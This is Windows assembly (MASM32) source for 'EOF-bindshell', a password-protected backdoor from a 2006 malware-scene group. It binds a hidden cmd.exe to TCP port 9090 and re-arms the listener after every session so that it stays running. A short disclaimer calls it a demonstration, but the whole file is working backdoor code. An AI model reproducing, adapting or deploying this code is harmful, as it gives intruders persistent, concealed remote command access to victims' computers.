;//App. Name    : EOF-bindshell
;//Coded by     : berniee/fakedminded
;//Based on     : KD-team reverse bindshell [c-coded]
;//Greetings    : SkyOut,RadiatioN ,izee,sk0r/Czybik,WarGame, and Nibble
;//Explanation  : This code will binds the cmd.exe to a specific port,and will return
;//               to the connection state after each closed session ,the bound shell
;//               is password protected .
;//WARNING      : The code is a simple demonstartion and is not intended 
;//               to cause any sort of damage to others pc or validating their privacy.


.586
.model flat,stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc
include \masm32\include\Ws2_32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\Ws2_32.lib


PORT_NO = 9090                                           ;change it according your desire
PWD equ <"beattheboss",0>                                ;change it according your desire

.data
CopyRight db "EOF-bindshell",13,10,0
pwd_msg db "Enter Password: ",0
szPwd db PWD                                    
err_pwd db 13,10,"beat it!!",13,10,0
byte_ db 0,0
cmd_ db "ComSpec",0

.data?
ws WSADATA <?>
sock_addr sockaddr_in<?>

stinfo STARTUPINFO <?>
pinfo PROCESS_INFORMATION<?>
socket_ dd ?
pointer_ dd ?
buffer db 10 dup(?)
run_ db 256 dup(?)


.code
start:
_connect:
invoke RtlZeroMemory,offset buffer,256
invoke RtlZeroMemory,offset sock_addr,sizeof sock_addr
invoke WSAStartup,001h,addr ws
invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0  ;socket() will not work in such
cmp eax,INVALID_SOCKET                                  ;kinds of applications!
je exit
mov socket_,eax
mov sock_addr.sin_family,AF_INET
invoke htons,PORT_NO
mov sock_addr.sin_port,ax
invoke htonl,INADDR_ANY
mov sock_addr.sin_addr.S_un.S_addr,eax
invoke bind,socket_,offset sock_addr,sizeof sock_addr
invoke listen,socket_,0
invoke accept,socket_,offset sock_addr,0

mov socket_,eax
invoke send,socket_,offset CopyRight,sizeof CopyRight,0
invoke send,socket_,offset pwd_msg,sizeof pwd_msg,0

recieve_:
invoke recv,socket_,offset byte_,1,0
invoke lstrcat,offset buffer,offset byte_
cmp byte_,0ah
jne recieve_

mov esi,offset buffer
mov edi,offset szPwd
mov ecx,sizeof szPwd
_pwd:
repne cmpsb
je next_char
jmp wrong_password
next_char:
cmp byte ptr [edi],0
jne _pwd

invoke GetEnvironmentVariable,offset cmd_,offset run_,256
cmp eax,0
je exit
mov stinfo.cb,sizeof STARTUPINFO
mov eax, socket_
mov stinfo.hStdOutput,eax 
mov stinfo.hStdError,eax 
mov eax, socket_
mov stinfo.hStdInput,eax
mov stinfo.dwFlags, STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES 
mov stinfo.wShowWindow,SW_HIDE
invoke CreateProcess,offset run_,0,0,0,TRUE,CREATE_NEW_CONSOLE,0,0,offset stinfo,offset pinfo
or eax,eax
jz exit

invoke WaitForSingleObject,pinfo.hProcess,-1
invoke CloseHandle,pinfo.hProcess
invoke CloseHandle,pinfo.hThread
invoke CloseHandle,socket_
wrong_password:
invoke send,socket_,offset err_pwd,sizeof err_pwd,0
invoke WSACleanup


jmp _connect                                        ;this will make it immortal
                                                    ;delete it if you dont want that.

exit:
invoke ExitProcess,0


end start



;CopyRites berniee/fakedminded[EOF] 2oo6 ---AllRights Reset